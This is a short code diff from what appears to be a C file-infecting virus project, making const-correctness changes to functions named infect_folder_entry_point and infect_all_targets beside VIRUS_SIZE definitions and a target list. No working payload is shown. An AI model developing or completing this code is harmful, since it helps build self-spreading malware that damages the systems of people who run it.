@@ -51,7 +51,7 @@ char                check_header_sanity(char *map, int size)
 #define VIRUS_SIZE      456
 #define VIRUS           789
 
-char                infect_folder_entry_point(char *self_name, const char *path)
+char                infect_folder_entry_point(const char *self_name, const char *path)
 {
     char            **files;
     t_entry         entry;
@@ -71,7 +71,7 @@ char                infect_folder_entry_point(char *self_name, const char *path)
     return (SUCCESS);
 }
 
-char                infect_all_targets(char *argv)
+char                infect_all_targets(const char *argv)
 {
     const char      *targets[] = TARGETS;
     int             i;
